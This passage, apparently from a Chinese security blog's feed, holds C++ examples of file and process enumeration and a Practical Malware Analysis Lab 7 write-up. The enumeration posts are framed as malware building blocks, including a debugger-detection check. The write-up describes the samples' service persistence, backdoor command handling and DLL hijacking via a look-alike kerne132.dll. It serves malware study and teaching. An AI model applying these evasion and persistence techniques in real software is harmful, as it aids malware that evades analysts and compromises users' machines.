class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">findFile</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszPath)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">findFile</span>(<span class="hljs-string">&quot;C:\\Users\\b1ackie\\Desktop&quot;</span>);<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">findFile</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszPath)</span></span><br><span class="hljs-function"></span>&#123;<br>DWORD dwBufferSize = <span class="hljs-number">4096</span>;<br><span class="hljs-keyword">char</span>* pszFileName = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">char</span>* pszNextPath = <span class="hljs-literal">NULL</span>;<br>WIN32_FIND_DATA FileData = &#123; <span class="hljs-number">0</span> &#125;;<br>BOOL flag = FALSE;<br><span class="hljs-comment">//申请动态内存</span><br>pszFileName = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[dwBufferSize];<br>pszNextPath = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[dwBufferSize];<br><span class="hljs-comment">//搜索当前路径下的所有文件</span><br><span class="hljs-built_in">sprintf</span>(pszFileName, <span class="hljs-string">&quot;%s\\*.*&quot;</span>, pszPath);<br><span class="hljs-keyword">char</span> ext[_MAX_EXT];<br><span class="hljs-comment">//创建一个TXT文件，将结果输出</span><br>FILE* fp;<br>fp = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;C:\\Users\\b1ackie\\Desktop\\1.txt&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>);<br>HANDLE hFile = <span class="hljs-built_in">FindFirstFile</span>(pszFileName, &amp;FileData);<br><span class="hljs-keyword">if</span> (hFile != INVALID_HANDLE_VALUE)<br>&#123;<br><span class="hljs-keyword">do</span><br>&#123;<br><span class="hljs-comment">//过滤掉当前目录和上级目录</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(FileData.cFileName,<span class="hljs-string">&quot;.&quot;</span>) || !<span class="hljs-built_in">strcmp</span>(FileData.cFileName, <span class="hljs-string">&quot;..&quot;</span>))<br>&#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-comment">//拼接文件路径</span><br><span class="hljs-built_in">sprintf</span>(pszNextPath, <span class="hljs-string">&quot;%s\\%s&quot;</span>, pszPath, FileData.cFileName);<br><span class="hljs-comment">//如果是一个目录的话，继续搜索</span><br><span class="hljs-keyword">if</span> (FileData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)<br>&#123;<br><span class="hljs-built_in">findFile</span>(pszNextPath);<br>&#125;<br><span class="hljs-comment">//不是的话就输出文件名字</span><br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-comment">//分割文件名字</span><br>_splitpath(pszNextPath, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, ext);<br><span class="hljs-comment">//判断是否是EXE文件</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(ext, <span class="hljs-string">&quot;.exe&quot;</span>))<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, pszNextPath);<br><span class="hljs-comment">//写入文件</span><br><span class="hljs-built_in">fprintf</span>(fp, <span class="hljs-string">&quot;%s\r\n&quot;</span>, pszNextPath);<br>&#125;<br>&#125;<br><span class="hljs-comment">//继续搜索</span><br>&#125; <span class="hljs-keyword">while</span> (<span class="hljs-built_in">FindNextFile</span>(hFile, &amp;FileData));<br>&#125;<br><span class="hljs-built_in">fclose</span>(fp);<br><span class="hljs-built_in">FindClose</span>(hFile);<br><span class="hljs-keyword">delete</span> []pszNextPath;<br>pszNextPath = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">delete</span> []pszFileName;<br>pszFileName = <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>运行程序，选择遍历的目录为桌面，查看结果可以看到成功输出了当前桌面所有的exe文件（包含子文件夹中的）。</p><p><img src="/2021/08/17/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF-%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86/1.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>《Windows黑客编程技术详解》</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>功能技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>功能技术-进程遍历</title>
    <link href="/2021/08/17/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E9%81%8D%E5%8E%86/"/>
    <url>/2021/08/17/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E9%81%8D%E5%8E%86/</url>
    
    <content type="html"><![CDATA[<h2 id="进程遍历"><a href="#进程遍历" class="headerlink" title="进程遍历"></a>进程遍历</h2><p>进程遍历就是遍历当前计算机上所有的进程信息，对于恶意代码来说，可以通过遍历获取进程的信息，可以通过这些信息来判断是否存在指定的进程，比如调试器、杀毒软件。遍历进程的方法有很多，最常用的就是通过进程快照来实现。</p><h2 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h2><h3 id="CreateToolhelp32Snapshot"><a href="#CreateToolhelp32Snapshot" class="headerlink" title="CreateToolhelp32Snapshot"></a>CreateToolhelp32Snapshot</h3><p>获取指定进程的快照，以及这些进程使用的堆、模块和线程。</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm">HANDLE CreateToolhelp32Snapshot(<br>  <span class="hljs-built_in">DWORD</span> dwFlags,<br>  <span class="hljs-built_in">DWORD</span> th32ProcessID<br>)<span class="hljs-comment">;</span><br></code></pre></div></td></tr></table></figure><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p>dwFlags：指定快照中包含的系统内容，这个参数能够使用下列数值中的一个或者多个。</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>THE32CS_INHERIT</td><td>声明快照句柄是可继承的</td></tr><tr><td>THE32CS_SNAPALL</td><td>在快照中包含系统中所有的进程和线程</td></tr><tr><td>THE32CS_SNAPHEAPLIST</td><td>在快照中包含在the32ProcessID中指定进程的所有堆</td></tr><tr><td>THE32CS_SNAPMODULE</td><td>在快照中包含在the32ProcessID中指定进程的所有模块</td></tr><tr><td>THE32CS_SNAPPROCESS</td><td>在快照中包含系统中所有的进程</td></tr><tr><td>THE32CS_SNAPTHREAD</td><td>在快照中包含系统中所有的线程</td></tr></tbody></table><p>th32ProcessID：指定将要快照的进程ID。如果该参数为0，则表示快照当前进程。该参数只有在设置了THE32CS_SNAPHEAPLIST或者THE32CS_SNAPMODULE后才有效，其他情况下应该忽略此参数，快照所有的进程。</p><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>若调用成功，则返回快照的句柄；若调用失败，则返回INVALID_HANDLE_VALUE。</p><h3 id="Process32First"><a href="#Process32First" class="headerlink" title="Process32First"></a>Process32First</h3><p>检索系统快照中遇到的第一个进程信息</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">BOOL <span class="hljs-title">Process32First</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HANDLE           hSnapshot,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPPROCESSENTRY32 lppe</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><h4 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h4><p>hSnapshot：从上次调用CreateToolhelp32Snapshot函数返回的快照句柄。</p><p>lppe：指向PROCESSENTRY32结构的指针 。它包含进程信息，例如可执行文件的名称、进程标识符和父进程的进程标识符。</p><h4 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h4><p>TRUE标识进程列表的第一个条目已经复制到缓冲区，FALSE表示失败。</p><h3 id="Process32Next"><a href="#Process32Next" class="headerlink" title="Process32Next"></a>Process32Next</h3><p>检索有关记录在系统快照中的下一个进程信息。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">BOOL <span class="hljs-title">Process32Next</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HANDLE           hSnapshot,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPPROCESSENTRY32 lppe</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><h4 id="参数-2"><a href="#参数-2" class="headerlink" title="参数"></a>参数</h4><p>hSnapshot：处理从先前调用CreateToolhelp32Snapshot函数返回的快照句柄</p><p>lppe：指向PROCESSENTRY32结构的指针。</p><h4 id="返回值-2"><a href="#返回值-2" class="headerlink" title="返回值"></a>返回值</h4><p>如果进程列表的下一个条目已经复制到缓冲区，则返回TRUE；否则返回FALSE。如果不存在任何进程或者快照不包含进程信息，则GetLastError会显示ERROR_NO_MORE_FILES。</p><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>调用CreateToolhelp32Snapshot可以获取当前的进程快照，如果成功便会得到一个进程信息列表，并且返回这个列表的起始索引。然后调用Process32First获取第一个进程信息，进程的信息都保存在PROCESSENTRY32结构体的缓冲区中。若要获取下一个进程信息，就可以调用Process32Next，循环即可获取所有的进程信息。直到Process32Next函数返回值是FALSE，且GetLastError错误代码为ERROR_NO_MORE_FILES，这就表示遍历已经结束了。</p><h2 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h2><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>PROCESSENTRY32 pe = &#123; <span class="hljs-number">0</span> &#125;;<br>pe.dwSize = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(PROCESSENTRY32);<br><span class="hljs-comment">//进程快照</span><br>HANDLE hProcessSnap = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (hProcessSnap == INVALID_HANDLE_VALUE)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-comment">//获取第一个进程信息</span><br>BOOL flag = <span class="hljs-built_in">Process32First</span>(hProcessSnap, &amp;pe);<br><span class="hljs-keyword">while</span> (flag)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[PID:%d]\t&quot;</span>, pe.th32ParentProcessID);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%s]\n&quot;</span>, pe.szExeFile);<br><span class="hljs-comment">//获取下一个进程信息</span><br>flag = <span class="hljs-built_in">Process32Next</span>(hProcessSnap, &amp;pe);<br>&#125;<br><span class="hljs-built_in">CloseHandle</span>(hProcessSnap);<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>运行查看效果，可以看到可以打印出当前的所有进程信息</p><p><img src="/2021/08/17/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E9%81%8D%E5%8E%86/1.png"></p><h2 id="反调试功能测试"><a href="#反调试功能测试" class="headerlink" title="反调试功能测试"></a>反调试功能测试</h2><p>可以通过遍历所有进程来查找是否存在一个调试器，只需要比较一下进程名即可</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">lstrcmp</span>(pe.szExeFile, <span class="hljs-string">&quot;吾爱破解[LCG].exe&quot;</span>))<br>&#123;<br><span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;发现调试器&quot;</span>, <span class="hljs-string">&quot;！！！&quot;</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>打开OD，可以看到就会弹窗提示存在调试器。</p><p><img src="/2021/08/17/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E9%81%8D%E5%8E%86/2.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>《Windows黑客编程技术详解》</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>功能技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>恶意代码分析实战-实验7</title>
    <link href="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/"/>
    <url>/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/</url>
    
    <content type="html"><![CDATA[<h2 id="Lab-7-1"><a href="#Lab-7-1" class="headerlink" title="Lab 7-1"></a>Lab 7-1</h2><h3 id="1-当计算机重启，这个程序如何确保它继续运行（达到持久化驻留）？"><a href="#1-当计算机重启，这个程序如何确保它继续运行（达到持久化驻留）？" class="headerlink" title="1.当计算机重启，这个程序如何确保它继续运行（达到持久化驻留）？"></a>1.当计算机重启，这个程序如何确保它继续运行（达到持久化驻留）？</h3><p>创建了一个系统服务来随系统启动，可以看到StartServiceCtrlDispatcherA函数。其中还有一个结构 ServiceStartTable。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-1-1.png"></p><figure class="highlight elm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elm">typedef struct _SERVICE_TABLE_ENTRYA &#123;<br>  <span class="hljs-type">LPSTR</span>                    lpServiceName;<br>  <span class="hljs-type">LPSERVICE_MAIN_FUNCTIONA</span> lpServiceProc;<br>&#125; <span class="hljs-type">SERVICE_TABLE_ENTRYA</span>, *<span class="hljs-type">LPSERVICE_TABLE_ENTRYA</span>;<br></code></pre></div></td></tr></table></figure><p>这个服务的名称是Malservice，servicemain函数是sub_401040。</p><h3 id="2-为什么这个程序会使用一个互斥量？"><a href="#2-为什么这个程序会使用一个互斥量？" class="headerlink" title="2.为什么这个程序会使用一个互斥量？"></a>2.为什么这个程序会使用一个互斥量？</h3><p>程序创建了一个名为“HGL345”的互斥量。</p><p>这是为了防止运行多个程序，首先调用OpenMutexA函数尝试打开名为“HGL345”互斥量句柄，如果已经存在就代表程序已经在运行了，就会退出，如果没有就调用 CreateMutexA创建互斥量。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-1-2.png"></p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-1-3.png"></p><h3 id="3-可以用来检测这个程序的基于主机特征是什么？"><a href="#3-可以用来检测这个程序的基于主机特征是什么？" class="headerlink" title="3.可以用来检测这个程序的基于主机特征是什么？"></a>3.可以用来检测这个程序的基于主机特征是什么？</h3><p>名为”Malservice“的服务或者是”HGL345“互斥量。</p><h3 id="4-检测这个恶意代码的基于网络特征是什么？"><a href="#4-检测这个恶意代码的基于网络特征是什么？" class="headerlink" title="4.检测这个恶意代码的基于网络特征是什么？"></a>4.检测这个恶意代码的基于网络特征是什么？</h3><p>在StartAddress函数中，会有联网的行为，可以看到其中的agent信息和URL。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-1-4.png"></p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-1-5.png"></p><h3 id="5-这个程序的目的是什么？"><a href="#5-这个程序的目的是什么？" class="headerlink" title="5.这个程序的目的是什么？"></a>5.这个程序的目的是什么？</h3><p>首先是创建互斥量防止启动多个。然后是创建一个名为Malservice的服务。然后开始设置时间，将时间设置为了2100年的1月1日0点。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-1-6.png"></p><p>然后调用WaitForSingleObject进入等待，等到前面设置的时间2100年1月1日0点。然后创建二十个同样的线程，来访问<a href="http://www.malwareanalysisbook.com/">http://www.malwareanalysisbook.com</a></p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-1-7.png"></p><p>可以理解为一个DDOS的恶意程序。</p><h3 id="6-这个程序什么时候完成执行？"><a href="#6-这个程序什么时候完成执行？" class="headerlink" title="6.这个程序什么时候完成执行？"></a>6.这个程序什么时候完成执行？</h3><p>不会完成执行，到2100年会创建20个线程，但是每个线程都是一个无线循环。</p><h2 id="Lab-7-2"><a href="#Lab-7-2" class="headerlink" title="Lab 7-2"></a>Lab 7-2</h2><h3 id="1-这个程序如何完成持久化驻留？"><a href="#1-这个程序如何完成持久化驻留？" class="headerlink" title="1.这个程序如何完成持久化驻留？"></a>1.这个程序如何完成持久化驻留？</h3><p>这个程序没有持久化驻留，执行一次完成后就会退出。</p><h3 id="2-这个程序的目的是什么？"><a href="#2-这个程序的目的是什么？" class="headerlink" title="2.这个程序的目的是什么？"></a>2.这个程序的目的是什么？</h3><p>程序首先初始化了COM，然后创建了一个COM对象。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-2-1.png"></p><p>其中rclsid的值如下图所示，类标识符，对应的是Internet Explorer。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-2-2.png"></p><p>riid接口标识符对应的是IWebBrowser2。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-2-3.png"></p><p>返回的COM对象保存在ppv中，会调用偏移为0x2C处的函数，而这个函数是Navigate函数，函数调用后，就会打开浏览器浏览“<a href="http://www.malwareanalysisbook.com/ad.html%E2%80%9D%EF%BC%8C%E4%B9%8B%E5%90%8E%E5%B0%B1%E6%98%AF%E4%B8%80%E4%BA%9B%E6%B8%85%E7%90%86%E5%B7%A5%E4%BD%9C%E3%80%82">http://www.malwareanalysisbook.com/ad.html”，之后就是一些清理工作。</a></p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-2-4.png"></p><h3 id="3-这个程序什么时候完成执行？"><a href="#3-这个程序什么时候完成执行？" class="headerlink" title="3.这个程序什么时候完成执行？"></a>3.这个程序什么时候完成执行？</h3><p>当执行完访问页面之后就会结束。</p><h2 id="Lab-7-3"><a href="#Lab-7-3" class="headerlink" title="Lab 7-3"></a>Lab 7-3</h2><h3 id="DLL"><a href="#DLL" class="headerlink" title="DLL"></a>DLL</h3><p>先来分析一下DLL文件</p><p>使用IDA打开DLL文件，首先可以看到，尝试打开一个互斥对象，如果不存在就创建一个互斥对象，互斥对象名为SADFHUHF</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-1.png"></p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-2.png"></p><p>然后就是SOCKET通信的流程，关于通信的流程可以参考<a href="https://b1ackie.cn/2021/08/06/%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-SOCKET%E9%80%9A%E4%BF%A1/">传输技术-SOCKET通信 </a>，这里地址是127.26.152.13：80，一个本地地址，真实情况肯定不会是一个本地的地址。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-3.png"></p><p>发送的信息是hello，然后会关闭这个send连接。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-4.png"></p><p>然后是recv函数接收信息，如果收到的信息是sleep就会调用sleep函数。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-5.png"></p><p>如果收到的信息是exec就会调用CreateProcessA来启动一个进程。进程是lpCommandLine这个参数。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-6.png"></p><p>看这个参数，看到是从第五个字节开始，而我们接收到的命令是exec XXXX，XXXX就是需要启动的进程。这是从远端发送过来的。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-7.png"></p><p>到这里基本上DLL就分析完毕了，再来分析一下EXE。</p><h3 id="EXE"><a href="#EXE" class="headerlink" title="EXE"></a>EXE</h3><p>分析一下EXE</p><p>要成功执行这个EXE还有一些限制，参数必须为WARNING_THIS_WILL_DESTROY_YOUR_MACHINE才可以执行这个程序。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-8.png"></p><p>像这样运行</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-9.png"></p><p>当满足条件后会开始运行程序，先创建了两个文件，C:\Windows\System32\kerne132.dll（注意这里不是“l”而是“1”）和Lab07-03.dll，还把它们映射到内存中。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-10.png"></p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-11.png"></p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-12.png"></p><p>再往下的代码比较多也比较复杂，我也没有过多分析，按照书上这部分是在比较内存、写入偏移或者写入内存。直接到后面来分析</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-13.png"></p><p>在进行完上述操作之后，先关闭句柄，然后复制文件，将Lab07-03.dll复制到C:</p><p>\Windows\System32\kerne132.dll，如果这个DLL已经存在的话，就不会调用4011E0这个函数，如果不存在复制过后就调用这个函数。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-14.png"></p><p>来查看这个函数，它的参数是C:\*，进来之后它会调用FindFirstFileA和FindNextFileA来遍历所有的文件，然后判断文件类型是否为EXE，</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-15.png"></p><p>如果是exe的话，就会调用4010A0函数它会将文件映射到内存中，然后调用IsBadReadPtr验证调用进程是否具有对指定内存范围的读取访问权限。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-16.png"></p><p>然后检查加载的DLL中是否存在kernel32.dll，如果存在的话就会让kerne132.dll替换它。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-17.png"></p><p>打开process monitor监控行为，可以看到大量的文件操作。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-18.png"></p><p>打开一个calc.exe查看其加载的DLL，可以看到加载了kerne132.dll。</p><p><img 